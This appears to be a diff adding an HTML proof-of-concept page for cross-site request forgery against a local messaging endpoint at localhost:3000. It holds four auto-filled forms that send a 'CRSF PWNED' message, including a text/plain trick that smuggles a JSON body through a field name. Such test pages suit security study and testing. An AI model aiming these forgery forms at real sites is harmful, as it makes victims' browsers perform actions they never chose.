@@ -1,0 +1,24 @@
+<html>
+    <body>
+        <form method="POST" action="http://localhost:3000/message" enctype="application/json">
+            <input type="number" name='to' value='1'/>
+            <input type="text" name='subject' value="CRSF PWNED" />
+            <input type="text" name='message' value='HAHAH' />
+            <input type="submit" />
+        </form>
+        <form method="POST" action="http://localhost:3000/message">
+            <input type="number" name='to' value='1' />
+            <input type="text" name='subject' value="CRSF PWNED" />
+            <input type="text" name='message' value='HAHAH' />
+            <input type="submit" />
+        </form>
+        <form method="POST" action="http://localhost:3000/message" enctype="text/plain">
+            <input type="text" name='{"to":1,"subject":"CRSF PWNED", "message":"' value='HAHAH"}' />
+            <input type="submit" />
+        </form>
+        <form method="POST" action="http://localhost:3000/message" enctype="application/json">
+            <input type="text" name='{"to":1,"subject":"CRSF PWNED", "message":"' value='HAHAH"}' />
+            <input type="submit" />
+        </form>
+    </body>
+</html>
